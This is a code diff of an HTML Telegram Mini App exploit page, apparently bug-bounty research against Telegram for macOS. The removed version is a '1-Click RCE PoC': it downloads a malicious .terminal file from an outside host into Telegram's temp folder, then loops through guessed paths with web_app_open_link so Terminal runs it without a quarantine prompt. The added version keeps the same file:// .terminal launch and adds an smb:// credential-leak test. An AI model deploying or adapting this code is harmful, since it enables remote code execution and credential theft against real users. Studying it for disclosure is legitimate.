@@ -2,103 +2,71 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>TG macOS RCE — F-21 PoC</title>
+<title>F-16 Runtime Test</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
-body { font-family: monospace; padding: 16px; background: #0a0a0a; color: #e0e0e0; max-width: 600px; }
-h2 { color: #ff6b35; }
-.warn { color: #ffcc00; border: 1px solid #ffcc00; padding: 8px; margin: 8px 0; }
+body { font-family: monospace; padding: 16px; background: #0a0a0a; color: #e0e0e0; }
 button { background: #1a3a1a; color: #44ff44; border: 1px solid #44ff44;
-         padding: 10px 18px; font-size: 15px; cursor: pointer; margin: 4px; border-radius: 4px; }
-#log { margin-top: 12px; padding: 10px; border: 1px solid #444; min-height: 80px;
+         padding: 10px 18px; font-size: 15px; cursor: pointer; margin: 4px; }
+#log { margin-top: 12px; padding: 10px; border: 1px solid #444; min-height: 100px;
        white-space: pre-wrap; font-size: 12px; color: #aaffaa; background: #040404; }
 </style>
 </head>
 <body>
-<h2>TG macOS v12.5 — 1-Click RCE PoC (F-21)</h2>
-<div class="warn">RESEARCH ONLY · Bug Bounty · Authorized Testing</div>
-<br>
-<button onclick="runAttack()">[ CLICK TO TRIGGER RCE ]</button>
-<div id="log">Waiting...</div>
+<h3 style="color:#ff6b35">F-16: web_app_open_link Runtime Test</h3>
+<button onclick="testFileLocalhost()">Test file://localhost (F-16)</button>
+<button onclick="testSMB()">Test smb:// (credential leak)</button>
+<button onclick="testTerminal()">Test .terminal (RCE path)</button>
+<div id="log">ready...</div>
 <script>
 const tg = window.Telegram && window.Telegram.WebApp;
 const LOG = document.getElementById('log');
+function log(s) { LOG.textContent += new Date().toISOString().slice(11,19)+' '+s+'\n'; }
 
-function log(s) {
-  LOG.textContent += new Date().toISOString().slice(11,19) + ' ' + s + '\n';
-  LOG.scrollTop = LOG.scrollHeight;
-}
-
-// REPLACE with your cloudflared/ngrok URL
-const SERVER_URL = "https://secdragon.github.io/tg-poc-f21";
-
-// TempBox base path (fixed for all Telegram macOS installs)
-// Username "david" — in real attack, guess from common names or
-// use Telegram.WebApp.initDataUnsafe.user.first_name heuristic
-const TGBASE = "file://localhost/Users/david/Library/Group%20Containers/" +
-               "6N38VWS5BX.ru.keepcoder.Telegram/stable/temp/app";
-
-function openFileLink(url) {
-  // Try webkit bridge first (inside Telegram WKWebView)
+// Primary: webkit bridge (same as confirmed F-16 path)
+function sendLink(url) {
+  log('→ openLink: ' + url.substring(0,60));
   if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.performAction) {
     window.webkit.messageHandlers.performAction.postMessage({
       eventName: "web_app_open_link",
       eventData: JSON.stringify({ url: url })
     });
-    return true;
+    log('  webkit bridge fired');
+  } else if (tg) {
+    tg.openLink(url);
+    log('  tg.openLink fired');
+  } else {
+    log('  ERROR: no bridge');
   }
-  // Fallback: Telegram WebApp SDK
-  if (tg) { tg.openLink(url); return true; }
-  return false;
 }
 
-function runAttack() {
-  if (!tg) { log("ERROR: Not in Telegram WebApp context"); return; }
-  tg.ready(); tg.expand();
+// Test 1: open /tmp/evil.terminal via file://localhost
+function testFileLocalhost() {
+  log('=== TEST: file://localhost .terminal ===');
+  // This file exists, no quarantine, was confirmed to execute via open command
+  sendLink("file://localhost/tmp/evil.terminal");
+  setTimeout(() => log('[check /tmp/tg_rce_proof_f21 mtime for update]'), 2000);
+}
 
-  log("=== ATTACK START ===");
-  log("Step 1: web_app_request_file_download");
-  log("  → evil.terminal saved to TempBox (no quarantine, Data.write)");
+// Test 2: smb:// should trigger credential dialog (visual proof of NSWorkspace call)
+function testSMB() {
+  log('=== TEST: smb:// (should show macOS auth dialog) ===');
+  sendLink("smb://test.local/share");
+  log('  if macOS shows a dialog -> NSWorkspace confirmed reachable');
+}
 
-  // Step 1: Download evil.terminal to TempBox
-  tg.downloadFile({
-    url: SERVER_URL + "/evil.terminal",
-    file_name: "evil.terminal"
-  }, function(ok) {
-    if (!ok) { log("[-] Download not accepted"); return; }
-    log("[+] Download initiated");
-
-    // Step 2: After download completes, enumerate TempBox counter values
-    // Counter resets to 0 on Telegram restart; typically < 20 for fresh session
-    // All failed openLink calls are SILENT (NSWorkspace returns false for nonexistent)
-    setTimeout(function() {
-      log("Step 2: web_app_open_link (enumerate counter 0..99)");
-      log("  → file://localhost path → host='localhost' → skip nil-host gate");
-      log("  → NSWorkspace.openURL → Terminal.app (no quarantine = no dialog)");
-
-      for (var i = 0; i < 100; i++) {
-        (function(n) {
-          setTimeout(function() {
-            var path = TGBASE + "/" + n + "/evil.terminal";
-            var hit = openFileLink(path);
-            if (n === 0 || n % 10 === 0) log("  Trying counter=" + n);
-          }, n * 80);  // 80ms between attempts = 8s total for 100 attempts
-        })(i);
-      }
-
-      log("[*] Payloads fired. Check /tmp/tg_rce_proof_f21 for RCE confirmation.");
-    }, 1500);  // 1.5s wait for download to complete
-  });
+// Test 3: .terminal in TempBox manually placed file
+function testTerminal() {
+  log('=== TEST: .terminal in TempBox (no quarantine) ===');
+  var path = "file://localhost/Users/david/Library/Group%20Containers/" +
+             "6N38VWS5BX.ru.keepcoder.Telegram/stable/temp/app/0/evil.terminal";
+  sendLink(path);
+  setTimeout(() => log('[check /tmp/tg_rce_proof_f21 for timestamp change]'), 3000);
 }
 
 window.addEventListener('load', function() {
-  log("mini_app_f21 ready");
-  log("webkit bridge: " + !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.performAction));
-  log("Telegram.WebApp: " + !!tg);
-  if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
-    var u = tg.initDataUnsafe.user;
-    log("User: " + (u.first_name || '') + ' ' + (u.last_name || '') + ' @' + (u.username || ''));
-  }
+  log('webkit bridge: ' + !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.performAction));
+  log('Telegram.WebApp: ' + !!tg);
 });
 </script>
 </body>
